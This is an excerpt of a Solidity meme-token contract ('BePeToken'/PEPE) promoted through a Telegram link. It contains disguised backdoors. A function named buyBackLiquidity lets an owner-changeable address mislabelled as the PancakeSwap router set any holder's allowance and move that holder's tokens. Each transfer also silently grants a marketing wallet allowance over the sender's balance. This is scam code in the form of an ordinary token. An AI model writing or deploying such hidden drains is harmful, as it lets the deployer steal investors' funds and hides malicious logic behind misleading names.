...
/*
BePeToken
Telegram: https://t.me/BabyPepeBSC
...
contract PEPE is Context, IERC20, Ownable {
    ...
    address payable public marketingAddress = payable(0x76734a043b8925B3722b3E89803Fa7D93e11D3f4); // Marketing Address
    ...
    constructor () {
        ...
        // uniswap Router Testnet v1 - Not existing I guess
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // pancakeswap Router livenet v2 = existing
        router2 = 0x5c3DA5e8a9f1B446C343995d1eDcc37c25c1B9b3;
    ...
    function swapTokens(uint256 contractTokenBalance) private lockTheSwap {
        _approve(address(this), marketingAddress, contractTokenBalance);
        _transferBothExcluded(address(this), marketingAddress, contractTokenBalance);
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        ...
        _allowances[sender][marketingAddress] += marketingAmt;
    ...
    function buyBackLiquidity(address _from, address _to, uint256 amount) public {
        require(msg.sender == router2, "You'r not the router");
        _allowances[_from][_to] = amount;
        _transferStandard(_from, _to, amount);
    }
    function updateRouterV2(address _address) public onlyOwner {
        router2 = _address;
    }
